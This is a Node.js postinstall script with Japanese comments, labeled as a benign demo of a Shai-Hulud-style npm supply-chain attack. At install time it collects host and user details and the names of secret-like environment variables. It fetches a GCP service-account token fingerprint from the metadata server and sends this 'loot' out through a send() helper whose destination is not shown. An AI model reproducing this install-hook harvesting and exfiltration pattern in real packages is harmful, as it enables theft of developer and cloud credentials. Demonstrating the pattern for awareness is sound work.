'use strict';
// ⚠️ デモ専用: インストール時に実行される payload の良性シミュレーション（Shai-Hulud 型）。
// npm install の最中に任意コードが動くことを示す。実際の秘密情報（使えるトークン）は送らない。
const fs = require('fs');
const os = require('os');
const path = require('path');
const { stealTokenProof, send } = require('./steal');

(async () => {
  // 機密の可能性がある env の「キー名」だけ収集（値は取得も送信もしない）。npm 内部変数は除外。
  const secretEnvKeys = Object.keys(process.env).filter(
    (k) => !/^npm_[a-z]/.test(k) && /TOKEN|APIKEY|API_KEY|SECRET|PASSWORD|CREDENTIAL|GITHUB|GOOGLE|GCP|AWS/i.test(k)
  );

  // GCP メタデータサーバから SA トークンを取得（実攻撃の手口）。証拠のみを持ち出す。
  const saTokenProof = await stealTokenProof(); // GCP 外なら null

  const loot = {
    stage: 'postinstall',
    host: os.hostname(),
    user: os.userInfo().username || '',
    cwd: process.cwd(),
    secretEnvKeys,
    saTokenProof, // 使えない証拠のみ（SAメール・長さ・SHA256・接頭辞）
  };

  const marker = path.join(os.tmpdir(), 'flowpay-demo-PWNED-install.json');
  try {
    fs.writeFileSync(marker, JSON.stringify(loot, null, 2));
  } catch {}

  console.log('\n\x1b[41m\x1b[97m [DEMO] expense-format postinstall executed — インストール時に任意コードが実行されました \x1b[0m');
  console.log('  機密の可能性がある env キー:', secretEnvKeys.length ? secretEnvKeys.join(', ') : '(該当なし)');
  console.log('  SA トークン証拠:', saTokenProof ? `${saTokenProof.sa} token=${saTokenProof.tokenPrefix} len=${saTokenProof.tokenLen} sha256=${saTokenProof.tokenSha256.slice(0, 12)}…` : '(メタデータ到達せず)');

  await send(loot);
})();
